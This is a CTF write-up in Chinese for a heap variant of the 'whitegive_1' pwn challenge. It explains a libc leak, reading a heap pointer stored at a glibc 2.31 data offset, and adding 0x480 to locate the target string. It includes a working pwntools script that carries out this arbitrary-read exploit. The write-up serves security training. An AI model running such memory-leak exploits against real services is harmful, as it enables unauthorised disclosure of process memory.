# week3whitegive_1_plus

## 题目简述

这是 `whitegive_1` 的堆版本：服务仍提供 libc 泄漏和任意地址读，但目标字符串位于堆上。利用配套 glibc 2.31 中一个保存堆指针的已知位置，先泄露堆基准地址，再按本题对象布局加 `0x480` 读取目标字符串。原解来自 0xdeadc0de。

## 解题过程

初始泄漏减去 `puts` 偏移得到 libc 基址。`libc + 0x1EC2C9` 在本题进程状态下落在包含堆指针的数据处；任意读返回的指针首个零字节不会被字符串接口直接带回，所以脚本在小端解析前补上 `\x00`。得到指针后加上 `0x480` 即目标字符串位置。

```python
from pwn import *

HOST = 'challenge-host'
PORT = 8008
p = remote(HOST, PORT)
sleep(1)
print(p.recvuntil(b": "))
libcBaseAddress = int(p.recvuntil(b"\n", True), 16) - 0x84420
aheapAddress = libcBaseAddress + 0x1EC2C9
print(p.recv())
p.send(p64(aheapAddress))
heapAddress = int.from_bytes(b'\x00' + p.recvuntil(b"Please", True), "little")
print(p.recv())
heapStringAddress = heapAddress + 0x480
p.send(p64(heapStringAddress))
print(p.recv())
```

## 方法总结

任意读利用的核心仍是“从已知映射找到未知映射的指针”。这里不经 `environ` 去栈，而是从 libc 数据区取得堆指针，再根据逆向得到的对象偏移定位字符串。`0x1EC2C9`、补零方式和 `0x480` 都是 glibc 版本及题目布局相关常量；换环境时必须重新验证。PDF 未保存最终 flag 文本，故不臆造结果。
